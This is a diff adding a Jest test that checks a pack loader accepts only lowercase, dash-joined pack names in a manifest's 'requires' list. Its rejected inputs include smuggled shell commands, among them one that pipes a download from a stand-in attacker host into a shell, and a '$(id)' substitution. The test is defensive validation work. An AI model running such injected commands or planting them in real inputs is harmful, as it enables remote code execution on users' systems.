@@ -43,6 +43,13 @@ describe("loadPacks", () => {
     expect(loadPacks(sourceWith({ base: { ...base, title: "" } }))).rejects.toThrow("title must be the name people read");
   });
 
+  test("accepts a required pack only by a pack name, so a crafted name cannot reach a command", async () => {
+    await expect(loadPacks(sourceWith({ base: { ...base, requires: ["memory", "pull-requests"] } }))).resolves.toHaveLength(1);
+    for (const name of ["memory; curl evil.example | sh", "$(id)", "memory\nid", "Memory", "-x", ""]) {
+      await expect(loadPacks(sourceWith({ base: { ...base, requires: [name] } }))).rejects.toThrow(`requires ${JSON.stringify(name)}: must be a pack name in lowercase words joined by dashes`);
+    }
+  });
+
   test("rejects a manifest whose name is not its directory", async () => {
     expect(loadPacks(sourceWith({ other: base }))).rejects.toThrow("name base does not match its directory other");
   });
